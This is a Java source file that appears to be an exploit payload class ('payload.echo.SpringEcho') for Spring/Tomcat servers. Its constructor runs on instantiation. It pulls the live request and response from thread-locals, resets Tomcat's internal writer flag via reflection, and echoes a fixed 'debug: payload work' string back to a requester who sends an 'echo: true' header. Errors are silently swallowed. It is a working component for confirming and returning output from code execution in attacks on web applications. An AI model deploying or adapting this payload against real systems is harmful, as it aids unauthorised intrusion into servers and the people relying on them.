package payload.echo;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class SpringEcho {
    String result;

    public SpringEcho() {
        try {
            result = "debug: payload work";
            exec();
        } catch (Exception ignored) {
        }
    }

    private void exec() throws Exception {
        echo();
    }

    private void echo() {
        try {
            // get from threadLocals
            RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
            HttpServletRequest servletRequest = ((ServletRequestAttributes) requestAttributes).getRequest();
            HttpServletResponse servletResponse = ((ServletRequestAttributes) requestAttributes).getResponse();

            ResponseFacade rf = (ResponseFacade) servletResponse;
            Field field = rf.getClass().getDeclaredField("response");
            field.setAccessible(true);
            Response resp = (Response) field.get(rf);

            field = resp.getClass().getDeclaredField("usingWriter");
            field.setAccessible(true);
            field.set(resp, Boolean.FALSE);

            String echoHeader = servletRequest.getHeader("echo");
            if (echoHeader != null && echoHeader.equals("true")) {
                ServletOutputStream out = servletResponse.getOutputStream();
                out.write(this.result.getBytes(StandardCharsets.UTF_8));
                out.flush();
                out.close();
                // 避免应用正常执行 getWriter 时报错
                field.set(resp, Boolean.FALSE);
            }
        } catch (Exception ignored) {
        }
    }
}
